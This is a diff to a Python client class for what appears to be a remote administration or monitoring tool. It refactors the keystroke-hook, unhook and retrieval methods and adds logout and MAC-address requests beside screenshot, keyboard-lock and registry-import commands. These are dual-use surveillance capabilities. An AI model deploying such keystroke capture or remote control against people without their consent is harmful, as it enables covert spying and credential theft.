@@ -37,6 +37,9 @@ class Client:
     def req_shutdown(self):
         send('shutdown')
 
+    def req_logout(self):
+        send('logout')
+
     def req_get_screenshot(self):
         send('getscreenshot')
         res = recv()
@@ -63,18 +66,15 @@ class Client:
         return res['data']
 
     def req_keystroke_hook(self):
-        data = dumps('keystroke-hook')
-        client_socket.sendall(data)
+        send('keystroke-hook')
     
     def req_keystroke_unhook(self):
-        data = dumps('keystroke-unhook')
-        client_socket.sendall(data)
+        send('keystroke-unhook')
     
     def req_keystroke_get(self):
-        data = dumps('keystroke-get')
-        client_socket.sendall(data)
-        res = loads(client_socket.recv(2**10))
-        return res
+        send('keystroke-get')
+        res = recv()
+        return res['data']
 
     def req_lock_keyboard(self):
         send('lock-keyboard')
@@ -111,3 +111,8 @@ class Client:
         send('reg-import', [content])
         res = recv()
         return res['ok']
+
+    def req_mac_address(self):
+        send('mac-address')
+        res = recv()
+        return res['data']
